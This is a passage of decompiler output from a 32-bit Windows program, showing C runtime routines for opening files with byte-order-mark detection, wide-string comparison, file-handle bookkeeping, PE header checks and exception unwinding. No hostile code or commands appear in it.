      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_00413ea2:
        local_18 = 5;
        goto LAB_00413e51;
      }
      if (uVar4 != 0x700) {
LAB_00413d59:
        puVar5 = (undefined4 *)FUN_0040cabd();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        puVar5 = (undefined4 *)FUN_0040caaa();
        *puVar5 = 0x16;
        FUN_0040ca42();
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_00413e51:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00423e78 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = FUN_00414bac();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = (undefined4 *)FUN_0040cabd();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 0x18;
    goto LAB_00413f6a;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_00413f76;
    }
    pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar6 = GetLastError();
    FUN_0040cad0(DVar6);
    goto LAB_00413f6a;
  }
LAB_00413f76:
  DVar6 = GetFileType(local_20);
  if (DVar6 == 0) {
    pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar6 = GetLastError();
    FUN_0040cad0(DVar6);
    CloseHandle(local_20);
    if (DVar6 == 0) {
      puVar5 = (undefined4 *)FUN_0040caaa();
      *puVar5 = 0xd;
    }
    goto LAB_00413f6a;
  }
  if (DVar6 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar6 == 3) {
    local_5 = local_5 | 8;
  }
  FUN_00414967(*in_EAX,local_20);
  bVar10 = local_5 | 1;
  *(byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar10;
  pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar10;
    if (bVar2 == 0) goto LAB_004142eb;
    if ((param_3 & 2) == 0) goto LAB_004140b1;
    local_1c = FUN_0040d96f(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      piVar7 = (int *)FUN_0040cabd();
      bVar10 = local_5;
      if (*piVar7 == 0x83) goto LAB_004140b1;
    }
    else {
      local_28 = 0;
      iVar3 = FUN_0040f1fa(*in_EAX,(LPWSTR)&local_28,(LPWSTR)0x1);
      if ((((iVar3 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar3 = FUN_00416c26(*in_EAX,local_1c,(int)local_1c >> 0x1f), iVar3 != -1)) &&
         (DVar6 = FUN_0040d96f(*in_EAX,0,0), bVar10 = local_5, DVar6 != 0xffffffff))
      goto LAB_004140b1;
    }
LAB_00414063:
    FUN_0040f93a(*in_EAX);
    goto LAB_00413f6a;
  }
LAB_004140b1:
  local_5 = bVar10;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_00414120;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00414120:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_004142eb;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar12 = FUN_0041544f(*in_EAX,0,0,2);
            if (lVar12 == 0) goto LAB_00414185;
            uVar13 = FUN_0041544f(*in_EAX,0,0,0);
            uVar4 = (uint)uVar13 & (uint)((ulonglong)uVar13 >> 0x20);
            goto LAB_00414251;
          }
LAB_0041417c:
          if (local_18 != 5) goto LAB_004142eb;
        }
LAB_00414185:
        iVar3 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_004142eb;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar8 = FUN_0041036b();
          if (iVar8 == -1) goto LAB_00414063;
          iVar3 = iVar3 + iVar8;
        } while (iVar3 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_0041417c;
              lVar12 = FUN_0041544f(*in_EAX,0,0,2);
              if (lVar12 != 0) {
                lVar12 = FUN_0041544f(*in_EAX,0,0,0);
                if (lVar12 == -1) goto LAB_00414063;
                goto LAB_004141d6;
              }
            }
            goto LAB_00414185;
          }
          goto LAB_004142eb;
        }
LAB_004141d6:
        iVar3 = FUN_0040f1fa(*in_EAX,(LPWSTR)&local_1c,(LPWSTR)0x3);
        if (iVar3 == -1) goto LAB_00414063;
        if (iVar3 == 2) {
LAB_0041425f:
          if ((local_1c & 0xffff) == 0xfffe) {
            FUN_0040f93a(*in_EAX);
            puVar5 = (undefined4 *)FUN_0040caaa();
            *puVar5 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            DVar6 = FUN_0040d96f(*in_EAX,2,0);
            if (DVar6 == 0xffffffff) goto LAB_00414063;
            local_6 = 2;
            goto LAB_004142eb;
          }
        }
        else if (iVar3 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_004142eb;
          }
          goto LAB_0041425f;
        }
        uVar4 = FUN_0040d96f(*in_EAX,0,0);
LAB_00414251:
        if (uVar4 == 0xffffffff) goto LAB_00414063;
      }
    }
  }
LAB_004142eb:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar9 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar9 == (HANDLE)0xffffffff) {
      DVar6 = GetLastError();
      FUN_0040cad0(DVar6);
      pbVar1 = (byte *)((&DAT_004257c0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      FUN_004149e8(*in_EAX);
LAB_00413f6a:
      puVar5 = (undefined4 *)FUN_0040caaa();
      return *puVar5;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_004257c0)[(int)*in_EAX >> 5]) = pvVar9;
  }
  return 0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int FUN_004143f0(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004206a0,0x14);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  puVar1 = *(undefined4 **)(unaff_EBP + 0x18);
  if (((puVar1 == (undefined4 *)0x0) || (*puVar1 = 0xffffffff, *(int *)(unaff_EBP + 8) == 0)) ||
     ((*(int *)(unaff_EBP + 0x1c) != 0 && ((*(uint *)(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    iVar3 = 0x16;
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  else {
    *(undefined4 *)(unaff_EBP + -4) = 0;
    uVar2 = FUN_00413cd0((undefined4 *)(unaff_EBP + -0x1c),*(LPCWSTR *)(unaff_EBP + 8),
                         *(uint *)(unaff_EBP + 0xc),*(int *)(unaff_EBP + 0x10),
                         (byte)*(undefined4 *)(unaff_EBP + 0x14));
    *(undefined4 *)(unaff_EBP + -0x20) = uVar2;
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_0041448e();
    iVar3 = *(int *)(unaff_EBP + -0x20);
    if (iVar3 != 0) {
      *puVar1 = 0xffffffff;
    }
  }
  return iVar3;
}



void FUN_0041448e(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_004257c0)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    FUN_00414b85(*unaff_EDI);
  }
  return;
}



void FUN_004144bc(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  FUN_004143f0();
  return;
}



int __cdecl FUN_004144dc(ushort *param_1,ushort *param_2,int param_3,undefined (**param_4) [16])

{
  ushort uVar1;
  ushort uVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined (*local_14 [2]) [16];
  int local_c;
  char local_8;
  
  iVar3 = 0;
  if (param_3 != 0) {
    if ((param_1 == (ushort *)0x0) || (param_2 == (ushort *)0x0)) {
      puVar4 = (undefined4 *)FUN_0040caaa();
      *puVar4 = 0x16;
      FUN_0040ca42();
      iVar3 = 0x7fffffff;
    }
    else {
      FUN_0040b970(local_14,param_4);
      if (*(int *)(local_14[0][1] + 4) == 0) {
        do {
          uVar1 = *param_1;
          if ((0x40 < uVar1) && (uVar1 < 0x5b)) {
            uVar1 = uVar1 + 0x20;
          }
          uVar8 = (uint)uVar1;
          uVar2 = *param_2;
          if ((0x40 < uVar2) && (uVar2 < 0x5b)) {
            uVar2 = uVar2 + 0x20;
          }
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          param_3 = param_3 + -1;
          uVar5 = (uint)uVar2;
        } while (((param_3 != 0) && (uVar1 != 0)) && (uVar1 == uVar2));
      }
      else {
        do {
          uVar6 = FUN_0041313c((uint)*param_1,local_14);
          uVar8 = uVar6 & 0xffff;
          uVar7 = FUN_0041313c((uint)*param_2,local_14);
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          param_3 = param_3 + -1;
          uVar5 = uVar7 & 0xffff;
          if ((param_3 == 0) || ((short)uVar6 == 0)) break;
        } while ((short)uVar6 == (short)uVar7);
      }
      iVar3 = uVar8 - uVar5;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar3;
}



int __cdecl FUN_004145c6(ushort *param_1,ushort *param_2,int param_3)

{
  ushort uVar1;
  ushort uVar2;
  int iVar3;
  undefined4 *puVar4;
  
  if (DAT_004241e8 == 0) {
    iVar3 = 0;
    if (param_3 != 0) {
      if ((param_1 == (ushort *)0x0) || (param_2 == (ushort *)0x0)) {
        puVar4 = (undefined4 *)FUN_0040caaa();
        *puVar4 = 0x16;
        FUN_0040ca42();
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          uVar1 = *param_1;
          if ((0x40 < uVar1) && (uVar1 < 0x5b)) {
            uVar1 = uVar1 + 0x20;
          }
          uVar2 = *param_2;
          if ((0x40 < uVar2) && (uVar2 < 0x5b)) {
            uVar2 = uVar2 + 0x20;
          }
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          param_3 = param_3 + -1;
        } while (((param_3 != 0) && (uVar1 != 0)) && (uVar1 == uVar2));
        iVar3 = (uint)uVar1 - (uint)uVar2;
      }
    }
  }
  else {
    iVar3 = FUN_004144dc(param_1,param_2,param_3,(undefined (**) [16])0x0);
  }
  return iVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041466c(undefined4 param_1)

{
  _DAT_00424424 = param_1;
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0041467b(void)

{
  BOOL BVar1;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004206c0,0x10);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  BVar1 = InitializeCriticalSectionAndSpinCount
                    (*(LPCRITICAL_SECTION *)(unaff_EBP + 8),*(DWORD *)(unaff_EBP + 0xc));
  *(BOOL *)(unaff_EBP + -0x1c) = BVar1;
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



bool __cdecl FUN_004146e0(short *param_1)

{
  if ((*param_1 == 0x5a4d) && (*(int *)(*(int *)(param_1 + 0x1e) + (int)param_1) == 0x4550)) {
    return *(short *)((int *)(*(int *)(param_1 + 0x1e) + (int)param_1) + 6) == 0x10b;
  }
  return false;
}



int __cdecl FUN_00414720(int param_1,uint param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  
  iVar2 = *(int *)(param_1 + 0x3c) + param_1;
  uVar3 = 0;
  iVar1 = *(ushort *)(iVar2 + 0x14) + 0x18 + iVar2;
  if (*(ushort *)(iVar2 + 6) != 0) {
    do {
      if ((*(uint *)(iVar1 + 0xc) <= param_2) &&
         (param_2 < *(int *)(iVar1 + 8) + *(uint *)(iVar1 + 0xc))) {
        return iVar1;
      }
      uVar3 = uVar3 + 1;
      iVar1 = iVar1 + 0x28;
    } while (uVar3 < *(ushort *)(iVar2 + 6));
  }
  return 0;
}



uint __cdecl FUN_00414770(int param_1)

{
  uint uVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  int **unaff_FS_OFFSET;
  int *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = FUN_0040d690;
  local_14 = *unaff_FS_OFFSET;
  local_c = DAT_00422044 ^ 0x4206e0;
  *unaff_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  bVar2 = FUN_004146e0((short *)&IMAGE_DOS_HEADER_00400000);
  if (CONCAT31(extraout_var,bVar2) != 0) {
    iVar3 = FUN_00414720(0x400000,param_1 - 0x400000);
    if (iVar3 != 0) {
      uVar1 = *(uint *)(iVar3 + 0x24);
      *unaff_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *unaff_FS_OFFSET = local_14;
  return 0;
}



void __cdecl FUN_00414830(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x414848,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



void __cdecl FUN_00414895(int param_1,uint param_2)

{
  uint uVar1;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_00414850;
  local_20 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      FUN_00414945(0x101);
      FUN_00414964();
    }
  }
  *unaff_FS_OFFSET = local_20;
  return;
}



undefined4 __fastcall FUN_0041493c(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dd8 = param_1;
  DAT_00422dd4 = in_EAX;
  DAT_00422ddc = unaff_EBP;
  return in_EAX;
}



undefined4 FUN_00414945(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dd8 = param_1;
  DAT_00422dd4 = in_EAX;
  DAT_00422ddc = unaff_EBP;
  return in_EAX;
}



void FUN_00414964(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



undefined4 __cdecl FUN_00414967(uint param_1,HANDLE param_2)

{
  undefined4 *puVar1;
  int iVar2;
  DWORD nStdHandle;
  
  if ((-1 < (int)param_1) && (param_1 < DAT_004257ac)) {
    iVar2 = (param_1 & 0x1f) * 0x40;
    if (*(int *)(iVar2 + (&DAT_004257c0)[(int)param_1 >> 5]) == -1) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_004149c4;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,param_2);
      }
LAB_004149c4:
      *(HANDLE *)(iVar2 + (&DAT_004257c0)[(int)param_1 >> 5]) = param_2;
      return 0;
    }
  }
  puVar1 = (undefined4 *)FUN_0040caaa();
  *puVar1 = 9;
  puVar1 = (undefined4 *)FUN_0040cabd();
  *puVar1 = 0;
  return 0xffffffff;
}



undefined4 __cdecl FUN_004149e8(uint param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < (int)param_1) && (param_1 < DAT_004257ac)) {
    iVar3 = (param_1 & 0x1f) * 0x40;
    piVar1 = (int *)((&DAT_004257c0)[(int)param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00414a4a;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_00414a4a:
      *(undefined4 *)(iVar3 + (&DAT_004257c0)[(int)param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  puVar2 = (undefined4 *)FUN_0040caaa();
  *puVar2 = 9;
  puVar2 = (undefined4 *)FUN_0040cabd();
  *puVar2 = 0;
  return 0xffffffff;
}



undefined4 __cdecl FUN_00414a6e(uint param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = (undefined4 *)FUN_0040cabd();
    *puVar1 = 0;
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 9;
    return 0xffffffff;
  }
  if ((((int)param_1 < 0) || (DAT_004257ac <= param_1)) ||
     (puVar1 = (undefined4 *)((param_1 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)param_1 >> 5]),
     (*(byte *)(puVar1 + 1) & 1) == 0)) {
    puVar1 = (undefined4 *)FUN_0040cabd();
    *puVar1 = 0;
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 9;
    FUN_0040ca42();
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = *puVar1;
  }
  return uVar2;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00414ae5(void)

{
  uint uVar1;
  int iVar2;
  int unaff_EBP;
  int iVar3;
  
  FUN_0040d634(&DAT_00420700,0xc);
  uVar1 = *(uint *)(unaff_EBP + 8);
  iVar3 = (uVar1 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)uVar1 >> 5];
  *(undefined4 *)(unaff_EBP + -0x1c) = 1;
  if (*(int *)(iVar3 + 8) == 0) {
    FUN_0040e055(10);
    *(undefined4 *)(unaff_EBP + -4) = 0;
    if (*(int *)(iVar3 + 8) == 0) {
      iVar2 = FUN_0041467b();
      if (iVar2 == 0) {
        *(undefined4 *)(unaff_EBP + -0x1c) = 0;
      }
      *(int *)(iVar3 + 8) = *(int *)(iVar3 + 8) + 1;
    }
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_00414b7c();
  }
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)((&DAT_004257c0)[(int)uVar1 >> 5] + 0xc + (uVar1 & 0x1f) * 0x40))
    ;
  }
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



void FUN_00414b7c(void)

{
  FUN_0040df7b(10);
  return;
}



void __cdecl FUN_00414b85(uint param_1)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_004257c0)[(int)param_1 >> 5] + 0xc + (param_1 & 0x1f) * 0x40));
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00414bac(void)

{
  int iVar1;
  undefined4 uVar2;
  undefined (*pauVar3) [16];
  int unaff_EBP;
  undefined4 *puVar4;
  int iVar5;
  
  FUN_0040d634(&DAT_00420720,0x18);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
  iVar5 = 0;
  *(undefined4 *)(unaff_EBP + -0x24) = 0;
  iVar1 = FUN_0040df92();
  if (iVar1 == 0) {
    uVar2 = 0xffffffff;
  }
  else {
    FUN_0040e055(0xb);
    *(undefined4 *)(unaff_EBP + -4) = 0;
    for (; *(int *)(unaff_EBP + -0x28) = iVar5, iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_004257c0)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        pauVar3 = FUN_00413b97(0x20,0x40);
        *(undefined (**) [16])(unaff_EBP + -0x20) = pauVar3;
        if (pauVar3 != (undefined (*) [16])0x0) {
          (&DAT_004257c0)[iVar5] = pauVar3;
          DAT_004257ac = DAT_004257ac + 0x20;
          while (pauVar3 < (undefined (*) [16])(&DAT_004257c0)[iVar5] + 0x80) {
            (*pauVar3)[4] = 0;
            *(undefined4 *)*pauVar3 = 0xffffffff;
            (*pauVar3)[5] = 10;
            *(undefined4 *)(*pauVar3 + 8) = 0;
            pauVar3 = pauVar3 + 4;
            *(undefined (**) [16])(unaff_EBP + -0x20) = pauVar3;
          }
          *(int *)(unaff_EBP + -0x1c) = iVar5 << 5;
          *(undefined *)((&DAT_004257c0)[(iVar5 << 5) >> 5] + 4) = 1;
          iVar1 = FUN_00414ae5();
          if (iVar1 == 0) {
            *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
          }
        }
        break;
      }
      for (; *(undefined4 **)(unaff_EBP + -0x20) = puVar4,
          puVar4 < (undefined4 *)((&DAT_004257c0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            FUN_0040e055(10);
            *(undefined4 *)(unaff_EBP + -4) = 1;
            if (puVar4[2] == 0) {
              iVar1 = FUN_0041467b();
              if (iVar1 == 0) {
                *(undefined4 *)(unaff_EBP + -0x24) = 1;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            *(undefined4 *)(unaff_EBP + -4) = 0;
            FUN_00414c7f();
          }
          if (*(int *)(unaff_EBP + -0x24) == 0) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              if (*(int *)(unaff_EBP + -0x24) == 0) {
                *(undefined *)(puVar4 + 1) = 1;
                *puVar4 = 0xffffffff;
                *(int *)(unaff_EBP + -0x1c) =
                     ((int)puVar4 - (&DAT_004257c0)[iVar5] >> 6) + iVar5 * 0x20;
                break;
              }
            }
            else {
              LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            }
          }
        }
      }
      if (*(int *)(unaff_EBP + -0x1c) != -1) break;
    }
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_00414d3d();
    uVar2 = *(undefined4 *)(unaff_EBP + -0x1c);
  }
  return uVar2;
}



void FUN_00414c7f(void)

{
  FUN_0040df7b(10);
  return;
}



void FUN_00414d3d(void)

{
  FUN_0040df7b(0xb);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00414d46(void)

{
  uint uVar1;
  undefined4 *puVar2;
  HANDLE hFile;
  BOOL BVar3;
  DWORD DVar4;
  int unaff_EBP;
  int iVar5;
  
  FUN_0040d634(&DAT_00420748,0x10);
  uVar1 = *(uint *)(unaff_EBP + 8);
  if (uVar1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
  }
  else {
    if ((-1 < (int)uVar1) && (uVar1 < DAT_004257ac)) {
      iVar5 = (uVar1 & 0x1f) * 0x40;
      if ((*(byte *)(iVar5 + 4 + (&DAT_004257c0)[(int)uVar1 >> 5]) & 1) != 0) {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)(iVar5 + 4 + (&DAT_004257c0)[(int)uVar1 >> 5]) & 1) != 0) {
          hFile = (HANDLE)FUN_00414a6e(*(uint *)(unaff_EBP + 8));
          BVar3 = FlushFileBuffers(hFile);
          if (BVar3 == 0) {
            DVar4 = GetLastError();
            *(DWORD *)(unaff_EBP + -0x1c) = DVar4;
          }
          else {
            *(undefined4 *)(unaff_EBP + -0x1c) = 0;
          }
          if (*(int *)(unaff_EBP + -0x1c) == 0) goto LAB_00414e08;
          puVar2 = (undefined4 *)FUN_0040cabd();
          *puVar2 = *(undefined4 *)(unaff_EBP + -0x1c);
        }
        puVar2 = (undefined4 *)FUN_0040caaa();
        *puVar2 = 9;
        *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
LAB_00414e08:
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_00414e1d();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
    }
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    FUN_0040ca42();
  }
  return 0xffffffff;
}



void FUN_00414e1d(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



void FUN_00414e27(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&DAT_00422de0 + uVar3);
    iVar2 = FUN_0040caf3(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_00414e48(void)

{
  code *pcVar1;
  undefined (*pauVar2) [16];
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420768,8);
  pauVar2 = FUN_0040cdba();
  pcVar1 = *(code **)(pauVar2[7] + 8);
  if (pcVar1 != (code *)0x0) {
    *(undefined4 *)(unaff_EBP + -4) = 0;
    (*pcVar1)();
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  }
  FUN_00416eda();
  return;
}



void FUN_00414e81(void)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cdba();
  if (*(code **)(pauVar1[7] + 0xc) != (code *)0x0) {
    (**(code **)(pauVar1[7] + 0xc))();
  }
  FUN_00414e48();
  return;
}



void FUN_00414e94(void)

{
  code *pcVar1;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420788,8);
  pcVar1 = (code *)FUN_0040cb6e(DAT_00424428);
  if (pcVar1 != (code *)0x0) {
    *(undefined4 *)(unaff_EBP + -4) = 0;
    (*pcVar1)();
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  }
  FUN_00414e48();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_00414ecc(void)

{
  DAT_00424428 = FUN_0040caf3(0x414e48);
  return;
}



void __cdecl FUN_00414edd(undefined4 param_1)

{
  DAT_0042442c = param_1;
  DAT_00424430 = param_1;
  DAT_00424434 = param_1;
  DAT_00424438 = param_1;
  return;
}



uint __fastcall FUN_00414efb(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
